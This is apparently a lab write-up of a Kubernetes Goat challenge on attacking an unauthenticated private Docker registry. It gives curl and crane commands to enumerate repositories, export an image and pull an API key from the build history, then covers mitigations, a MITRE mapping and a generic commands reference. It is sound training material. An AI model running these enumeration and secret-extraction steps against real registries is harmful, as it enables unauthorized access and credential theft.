# Scenario 7: Attacking Private Registry

## Overview

This challenge demonstrates the risks of exposing private container registries without authentication, and how secrets can leak through Docker image metadata even when developers think they've secured their code.

## Attack Vector

An unauthenticated Docker Registry API v2 endpoint was discovered during reconnaissance. The registry allowed anonymous enumeration and image pulls, exposing internal container images and their embedded secrets.

## Tools Used

- **curl** - API probing and enumeration
- **crane** - Google's container registry CLI tool for image inspection and export
- **jq** - JSON parsing

## Attack Walkthrough

### Step 1: Registry Discovery

Probed the standard Docker Registry API endpoint:

```bash
curl http://127.0.0.1:1235/v2/
# Returns: {} with HTTP 200 - registry is alive and unauthenticated
```

**Finding**: No authentication required - this is a significant misconfiguration.

### Step 2: Repository Enumeration

Listed all available repositories using the catalog API:

```bash
curl -s http://127.0.0.1:1235/v2/_catalog | jq .
```

**Result**:
```json
{
  "repositories": [
    "madhuakula/k8s-goat-alpine",
    "madhuakula/k8s-goat-users-repo"
  ]
}
```

The `users-repo` name suggested potentially sensitive content.

### Step 3: Tag Enumeration

Listed available tags for the interesting repository:

```bash
curl -s http://127.0.0.1:1235/v2/madhuakula/k8s-goat-users-repo/tags/list | jq .
```

**Result**: Single `latest` tag available.

### Step 4: Image Export and Analysis

Used `crane` to export the image for analysis:

```bash
crane export 127.0.0.1:1235/madhuakula/k8s-goat-users-repo:latest users-repo.tar --insecure
```

Initial analysis of the flattened filesystem showed clean application code - the developer properly used environment variables:

```python
API_KEY = os.environ['API_KEY']  # Good practice in code
```

### Step 5: Image History Analysis (The Real Finding)

Examined the image build history to see how the image was constructed:

```bash
crane config 127.0.0.1:1235/madhuakula/k8s-goat-users-repo:latest --insecure | jq '.history'
```

**Critical Finding**: The Dockerfile set the API key as an environment variable:

```json
{
  "created": "2020-06-13T20:16:46.673369545Z",
  "created_by": "/bin/sh -c #(nop)  ENV API_KEY=k8s-goat-cf658c56a501385205cc6d2dafee8fc1"
}
```

The developer thought using `ENV` was secure, but environment variables set in Dockerfiles are permanently stored in image metadata.

## Key Lessons

### Why This Matters

1. **ENV directives are not secrets** - They're stored in plain text in image metadata
2. **Image history is permanent** - Even if you delete files in later layers, earlier layers retain them
3. **Unauthenticated registries are dangerous** - They expose your entire container inventory to attackers

### Real-World Impact

- **Capital One (2019)** - Misconfigured access led to exposure of 100M+ customer records
- **Tesla (2018)** - Unsecured Kubernetes dashboard exposed AWS credentials
- Internal registries often contain proprietary code, configuration, and embedded secrets

## Mitigations

### Registry Security

| Control | Description |
|---------|-------------|
| **Enable Authentication** | Require credentials for all registry operations |
| **Use TLS** | Encrypt traffic to prevent credential sniffing |
| **Network Segmentation** | Don't expose registries to untrusted networks |
| **Audit Logging** | Monitor for unauthorized access attempts |

### Secret Management

| Bad Practice | Better Approach |
|--------------|-----------------|
| `ENV API_KEY=secret` in Dockerfile | Use Kubernetes Secrets mounted at runtime |
| Hardcoded credentials in code | External secret management (Vault, AWS Secrets Manager) |
| Committing `.env` files | Use `.gitignore` and pre-commit hooks |

### Image Hygiene

```dockerfile
# BAD - secret baked into image
ENV API_KEY=my-secret-key

# BETTER - expect secret at runtime
# (pass via K8s Secret or docker run -e)
ENV API_KEY=""
```

Use multi-stage builds to avoid leaking build-time secrets:

```dockerfile
# Build stage (not in final image)
FROM builder AS build
ARG BUILD_SECRET
RUN build-with-secret.sh

# Final stage (clean)
FROM alpine
COPY --from=build /app /app
```

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Container and Resource Discovery | T1613 | Enumerated registry contents |
| Unsecured Credentials | T1552.001 | Retrieved credentials from image metadata |
| Valid Accounts | T1078 | Obtained API key for further access |

## Commands Reference

```bash
# Check if registry requires auth
curl http://<registry>/v2/

# List all repositories
curl http://<registry>/v2/_catalog

# List tags for a repo
curl http://<registry>/v2/<repo>/tags/list

# View image manifest
crane manifest <registry>/<repo>:<tag> --insecure

# View image build history
crane config <registry>/<repo>:<tag> --insecure | jq '.history'

# Export image filesystem
crane export <registry>/<repo>:<tag> output.tar --insecure

# Extract specific layer
crane blob <registry>/<repo>@sha256:<digest> --insecure > layer.tar.gz
```

## References

- [Docker Registry HTTP API V2](https://docs.docker.com/registry/spec/api/)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [CIS Docker Benchmark - Registry Security](https://www.cisecurity.org/benchmark/docker)
- [crane documentation](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md)
